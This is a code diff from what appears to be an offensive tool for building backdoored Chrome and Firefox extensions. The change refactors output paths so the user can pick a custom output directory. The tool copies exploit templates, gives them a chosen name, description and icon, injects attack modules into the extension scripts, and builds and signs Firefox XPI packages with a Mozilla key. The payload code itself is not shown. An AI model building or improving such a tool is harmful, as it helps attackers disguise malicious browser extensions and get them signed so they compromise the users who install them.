@@ -27,7 +27,8 @@ def copy(src, dest):
             print('Directory not copied. Error: %s' % e)
 
 
-def verify_xpi(output_name):
+def verify_xpi(information_array):
+	output_name = information_array['output_name']
 	FNULL = open(os.devnull, 'w')
 	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking USER-KEY..."
 	config_file = open('config.ini').read()
@@ -36,7 +37,7 @@ def verify_xpi(output_name):
 		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking PRIV-KEY..."
 		priv_key = config_file.split('MOZ_PRIV_KEY=')[1].split('#')[0]
 		if priv_key != '':
-			xpi_file = glob.glob('output/'+output_name+'/*.xpi')
+			xpi_file = glob.glob(information_array['output_dir']+output_name+'/*.xpi')
 			xpi_file =  xpi_file[0]
 			try:
 				action = 0
@@ -61,20 +62,21 @@ def verify_xpi(output_name):
 	else:
 		print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"
 
-def generate_xpi(output_name):
+def generate_xpi(information_array):
+	output_name = information_array['output_name']
 	FNULL = open(os.devnull, 'w')
 	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking JPM..."
 	try:
 		subprocess.call(["jpm"],stdout=FNULL, stderr=subprocess.STDOUT)
 		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] generate XPI file..."
-		subprocess.call(["jpm", "xpi", '--addon-dir=output/'+output_name+''],stdout=FNULL, stderr=subprocess.STDOUT)
+		subprocess.call(["jpm", "xpi", '--addon-dir='+information_array['output_dir']+output_name+''],stdout=FNULL, stderr=subprocess.STDOUT)
 		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] XPI OK." 
 		user_input = raw_input('\nSign XPI ? [Y/n] ')
 		if user_input == '' or user_input == 'y' or user_input == 'Y':
-			verify_xpi(output_name)
+			verify_xpi(information_array)
 	except OSError as e:
 		if e.errno == os.errno.ENOENT:
-			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error on JPM."
+			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error on JPM please install it."
 		else:
 			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] JPM not found."
 
@@ -109,7 +111,8 @@ def insert_module():
 
 
 
-def load_module(backdoor_name):
+def load_module(information_array):
+	backdoor_name = information_array['output_name']
 	action = 0
 	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Loading..."
 	print "---------------"
@@ -121,13 +124,13 @@ def load_module(backdoor_name):
 		user_input =  raw_input('\nName of module ? ')
 		if os.path.isfile('includes/module/'+user_input+'.lframework'):
 			load_module_content  = open('includes/module/'+user_input+'.lframework').read()
-			if os.path.isfile('output/' + backdoor_name + '/js/check.js'):
-				load_check = open('output/' + backdoor_name + '/js/check.js', 'w').close()
-				load_check = open('output/' + backdoor_name + '/js/check.js', 'a+')
+			if os.path.isfile(information_array['output_dir'] + backdoor_name + '/js/check.js'):
+				load_check = open(information_array['output_dir'] + backdoor_name + '/js/check.js', 'w').close()
+				load_check = open(information_array['output_dir'] + backdoor_name + '/js/check.js', 'a+')
 				original_check = open('includes/exploit/chrome/js/check.js')
-			elif os.path.isfile('output/' + backdoor_name + '/data/content.js'):
-				load_check = open('output/' + backdoor_name + '/data/content.js', 'w').close()
-				load_check = open('output/' + backdoor_name + '/data/content.js', 'a+')
+			elif os.path.isfile(information_array['output_dir'] + backdoor_name + '/data/content.js'):
+				load_check = open(information_array['output_dir'] + backdoor_name + '/data/content.js', 'w').close()
+				load_check = open(information_array['output_dir'] + backdoor_name + '/data/content.js', 'a+')
 				original_check = open('includes/exploit/firefox/data/content.js')
 			if original_check != '':
 				for line in original_check:
@@ -149,20 +152,21 @@ def load_module(backdoor_name):
 
 def making(information_array):
 	output_name = raw_input('Output Name : ')
+	information_array['output_name'] = output_name
 	if output_name != '':
 		if information_array['type_backdoor'] == 'G':
 			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Google Chrome"
-			copy('includes/exploit/chrome', 'output/'+output_name)
+			copy('includes/exploit/chrome', information_array['output_dir'] + output_name)
 			if os.path.isfile('includes/exploit/icons/' + information_array['icon']):
-				copy('includes/exploit/icons/' + information_array['icon'], 'output/'+output_name+'/img/')
+				copy('includes/exploit/icons/' + information_array['icon'], information_array['output_dir']+output_name+'/img/')
 			elif os.path.isfile(information_array['icon']):
-				copy(information_array['icon'], 'output/'+output_name+'/img/')
+				copy(information_array['icon'], information_array['output_dir']+output_name+'/img/')
 			print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Pattern copied'
 			# INSERT BACKDOOR_INFORMATION ASPECT
-			if(os.path.isfile('output/' + output_name + '/manifest.json')):
+			if(os.path.isfile(information_array['output_dir'] + output_name + '/manifest.json')):
 				basic_manifest = open('includes/exploit/chrome/manifest.json')
-				erase_file = open('output/' + output_name + '/manifest.json', 'w').close()
-				new_manifest = open('output/' + output_name + '/manifest.json', 'a+')
+				erase_file = open(information_array['output_dir'] + output_name + '/manifest.json', 'w').close()
+				new_manifest = open(information_array['output_dir'] + output_name + '/manifest.json', 'a+')
 				for line in basic_manifest:
 					if "//NAME//" in line:
 						line = line.replace("//NAME//", information_array['title'])
@@ -179,22 +183,22 @@ def making(information_array):
 			# LOAD MODULE
 			user_input = raw_input('\nLoad Module ? [Y/n]: ')
 			if user_input == '' or user_input == 'Y' or user_input == 'y':
-				load_module(output_name)
+				load_module(information_array)
 			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 		elif information_array['type_backdoor'] == 'F':
 			print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Mozilla Firefox"
-			copy('includes/exploit/firefox', 'output/'+output_name)
+			copy('includes/exploit/firefox', information_array['output_dir'] + output_name)
 			if os.path.isfile('includes/exploit/icons/'+information_array['icon']):
-				copy('includes/exploit/icons/' + information_array['icon'], 'output/'+output_name+'/icon.png')
+				copy('includes/exploit/icons/' + information_array['icon'], information_array['output_dir']+output_name+'/icon.png')
 			elif os.path.isfile(information_array['icon']):
-				copy(information_array['icon'], 'output/'+output_name+'/icon.png')
+				copy(information_array['icon'], information_array['output_dir']+output_name+'/icon.png')
 			print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Pattern copied'
 			# INSERT BACKDOOR_INFORMATION ASPECT
-			if os.path.isfile('output/'+output_name+'/package.json'):
+			if os.path.isfile(information_array['output_dir'] + output_name+'/package.json'):
 				basic_manifest = open('includes/exploit/firefox/package.json')
-				erase = open('output/' + output_name + '/package.json', 'w').close()
-				new_manifest = open('output/' + output_name+ '/package.json', 'a+')
+				erase = open(information_array['output_dir'] + output_name + '/package.json', 'w').close()
+				new_manifest = open(information_array['output_dir'] + output_name+ '/package.json', 'a+')
 				for line in basic_manifest:
 					if "//NAME_NB//" in line:
 						line = line.replace("//NAME_NB//", str(random.randint(1000,99999)))
@@ -213,21 +217,35 @@ def making(information_array):
 			new_manifest.close()
 			user_input = raw_input('\nLoad Module ? [Y/n]: ')
 			if user_input == '' or user_input == 'Y' or user_input == 'y':
-				load_module(output_name)
+				load_module(information_array)
 			user_input = raw_input('\nGenerate XPI (need JPM) ? [Y/n]')
 			if user_input == 'Y' or user_input == '' or user_input == 'y':
-				generate_xpi(output_name)
+				generate_xpi(information_array)
 			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."
 
 def backdooring(backdoor_type):
+	action = 0
 	backdoor_information = {}
 	backdoor_information['title'] = ""
 	backdoor_information['description'] = ""
 	backdoor_information['version'] = ""
 	backdoor_information['icon'] = ""
 	backdoor_information['type_backdoor'] = backdoor_type
-	action = 0
+	while action == 0:
+		backdoor_information['output_dir'] = raw_input('Output directory ('+os.getcwd()+'/output/[outputname]) ? ')
+		if not os.path.isdir(backdoor_information['output_dir']) and backdoor_information['output_dir'] != '':
+			user_input = raw_input("["+bcolors.WARNING +"!"+ bcolors.ENDC+"] Not directory create it ? [Y/n] ")
+			if user_input == '' or user_input == 'Y' or user_input == 'y':
+				os.makedirs(backdoor_information['output_dir'])
+				print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Directory created! "
+				action = 1
+		elif backdoor_information['output_dir'] == '':
+			backdoor_information['output_dir'] = 'output/'
+			action = 1
 
+	if backdoor_information['output_dir'][-1:] != '/':
+		backdoor_information['output_dir'] = backdoor_information['output_dir'] + '/'
+	action = 0
 	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Now configuring aspect..."
 	while action == 0:
 		backdoor_information['title'] = raw_input('Backdoor Name : ')
